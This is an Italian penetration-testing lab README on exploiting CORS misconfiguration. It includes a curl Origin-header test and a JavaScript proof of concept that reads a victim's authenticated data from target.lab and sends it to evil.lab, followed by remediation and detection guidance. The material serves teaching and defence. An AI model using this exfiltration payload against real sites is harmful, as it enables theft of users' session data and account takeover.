> [English](README.en.md) | **Italiano**

# CORS misconfiguration

> - **Fase:** Web exploitation - OWASP A05:2021 Security Misconfiguration
> - **Visibilita:** Bassa - richieste cross-origin con header `Origin` manipolato; l'exfiltration avviene lato browser della vittima
> - **Prerequisiti:** un endpoint che riflette o valida male l'header `Origin` nella risposta CORS, specie con `Access-Control-Allow-Credentials: true`
> - **Natura del documento:** metodologia + payload pratici per ambiente di laboratorio. Nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: sfruttare una policy CORS permissiva per leggere, dal browser della vittima, dati autenticati di un'altra origine ed esfiltrarli verso un sito controllato.

---

## Executive summary

Il CORS regola quali origini possono leggere le risposte cross-origin. Una configurazione errata - tipicamente
**riflettere l'`Origin` della richiesta** nell'header `Access-Control-Allow-Origin` insieme a
`Access-Control-Allow-Credentials: true` - permette a un sito dell'attaccante di far fare al browser della
vittima richieste autenticate verso l'app vulnerabile e di **leggerne la risposta** (dati personali, token,
chiavi API). La severity tipica e `Alto` (furto di dati autenticati), piu alta se la risposta contiene segreti
riutilizzabili.

## Esecuzione / comandi

### Fase 1 - test della policy

```bash
# Si invia un Origin arbitrario e si osservano gli header CORS in risposta
curl -s -I https://target.lab/api/me -H "Origin: https://evil.lab"
```

```
# Configurazione sfruttabile (riflette l'origin + credenziali abilitate):
Access-Control-Allow-Origin: https://evil.lab   <-- origin riflesso
Access-Control-Allow-Credentials: true          <-- i cookie vengono inviati e la risposta e leggibile
```

Varianti di misconfig da testare: `Origin: null` (accettato), match solo del prefisso/suffisso
(`evil.target.lab`, `target.lab.evil.lab`), regex deboli.

### Fase 2 - exfiltration (PoC lato attaccante)

Pagina ospitata su `evil.lab` che la vittima visita: il browser invia i cookie e l'attaccante legge la risposta.

```html
<script>
fetch('https://target.lab/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.lab/collect?d=' + encodeURIComponent(d)));  // esfiltra i dati autenticati
</script>
```

Output illustrativo (sul server dell'attaccante):

```
GET /collect?d=%7B%22user%22%3A%22admin%22%2C%22apiKey%22%3A%22****%22%7D   <-- dati della vittima esfiltrati
```

## Analisi dei risultati

Se la risposta contiene l'`Origin` riflesso + `Allow-Credentials: true`, il furto di dati autenticati e
possibile: severity `Alto` (o `Critico` se la risposta include token/chiavi riutilizzabili). Se l'app usa una
allowlist fissa di origini e non riflette l'input, il vettore e chiuso.

### Analisi teorica

Il CORS e un controllo di fiducia tra origini: dire "mi fido di chi chiede" (riflettere l'origin) con credenziali
abilitate annulla la Same-Origin Policy. La contromisura e una **allowlist esplicita** di origini fidate, mai la
riflessione dell'input, e `Allow-Credentials: true` solo verso origini note.

## Remediation (blue team)

**Rilevamento.** Risposte in cui `Access-Control-Allow-Origin` coincide con un `Origin` arbitrario della
richiesta; `Allow-Credentials: true` con origin riflesso; accettazione di `Origin: null`.

**Hardening.** Allowlist statica di origini; non riflettere mai l'`Origin`; evitare `Allow-Credentials: true`
dove non indispensabile; validare l'intera origine (schema+host+porta), non prefissi/suffissi.

---

## Scenario reale: proiezione post-exploitation

> Vale per l'esito "furto dati autenticati" (severity Alto/Critico).

**Red team:** sito `evil.lab` con il PoC fetch; la vittima autenticata lo visita; i suoi dati/token vengono
letti ed esfiltrati, poi riusati verso l'app (account takeover o accesso API).

**Blue team:** rilevare `Allow-Origin` riflesso e `Origin: null` accettato; correggere con allowlist; ruotare i
token eventualmente esposti. Lezione: il CORS non va "aperto per comodita", e un perimetro di fiducia.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | manipola l'header `Origin` e analizza la risposta cors |
| `curl` | client http | cli - attivo | test rapido degli header cors con origin arbitrario |
| `CORScanner` | scanner | cli - attivo | rilevamento automatizzato di misconfigurazioni cors |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | sfruttamento della policy cors permissiva su un endpoint esposto. |
| credential access | steal web session cookie | `T1539` | lettura cross-origin di dati/token di sessione autenticati. |
| collection | data from information repositories | `T1213` | esfiltrazione dei dati autenticati letti dalla risposta. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [xss](<../xss (Cross-Site Scripting)/README.md>) | cors misconfiguration | entrambe esfiltrano dati lato browser; spesso combinate |
| cors misconfiguration | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (allowlist origini) si collega al secure coding |

---

> **Nota:** Contenuto didattico. I payload sono funzionanti e vanno usati solo su applicazioni di proprieta o con autorizzazione esplicita, in laboratorio. Output illustrativi.
